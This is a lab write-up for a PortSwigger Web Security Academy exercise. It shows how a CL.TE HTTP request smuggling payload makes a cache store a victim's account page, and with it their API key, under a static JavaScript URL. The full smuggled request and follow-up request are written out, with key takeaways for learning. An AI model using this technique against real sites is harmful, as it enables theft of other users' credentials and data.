# Exploiting HTTP - request smuggling to perform web cache deception

## 📌 Lab Details
- **Title**: Exploiting HTTP request smuggling to perform web cache deception
- **Difficulty**: Expert
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/2beac929d831e232f42ba851c86ef44ab27d908abcc5d78ed79a5cbc6c710a13?referrer=%2fweb-security%2frequest-smuggling%2fexploiting%2flab-perform-web-cache-deception

## 🔍 Summary
This lab shows how to exploit **HTTP request smuggling** to perform **web cache deception**.
By smuggling a request for `/my-account`, the victim’s **API key response** is cached under a static resource URL. The attacker can then retrieve this cached content and steal the victim’s API key.

## 🛠 Steps to Solve
1. Log in to your account and access the user account page.
2. Observe that the response doesn't have any anti-caching headers.
3. Smuggle the following request to fetch the **API key**:
   ```sh
   POST / HTTP/1.1
   Host: 0a0e00f20463d7c481e85c1d000f00d9.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 42
   Transfer-Encoding: chunked

   0  

   GET /my-account HTTP/1.1
   X-Ignore: X
   ```
4. Repeat this request a few times, then send the following request for `/resources/js/tracking.js`:
   ```sh
   GET /resources/js/tracking.js HTTP/1.1
   Host: 0a0e00f20463d7c481e85c1d000f00d9.web-security-academy.net
   Cookie: session=OYZU2oFSdrP10iu3onNY2orHgUtQcSI1
   Sec-Ch-Ua-Platform: "Windows"
   Accept-Language: en-US,en;q=0.9
   Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
   Sec-Ch-Ua-Mobile: ?0
   Accept: */*
   Sec-Fetch-Site: same-origin
   Sec-Fetch-Mode: no-cors
   Sec-Fetch-Dest: script
   Referer: https://0a0e00f20463d7c481e85c1d000f00d9.web-security-academy.net/
   Accept-Encoding: gzip, deflate, br
   Priority: u=1
   ```
5. Submit the victim's **API key** as the lab solution.


## 📖 Key Takeaways
- Poisoning = attacker injects malicious response → cached for others.
- Deception = victim’s sensitive response → cached, attacker retrieves it.
- Front-end and back-end desync enables **mis-cached responses**.
- Timing is crucial: you must align your smuggled request with the victim’s request.
- Static resources (normally safe) can end up serving **sensitive data** due to cache confusion.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3a41daad-8c85-485b-81de-c202565f3cbf" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9002789c-0acd-4142-afdb-9c6544828ee2" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3ac9f116-f19d-4707-aaaf-d74d4459552c" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/62800bf9-8c67-4a2e-8e15-376c07b2b090" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d768b6af-44cb-4a89-b3ce-b7d9a66896ff" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/59b8fcf7-bf27-4a54-9a0c-000ae59c6e8f" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b3a44c60-05da-4178-9b84-1c10bd0bb5c7" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e4218623-78ab-4678-9dc8-70f43f192d92" />
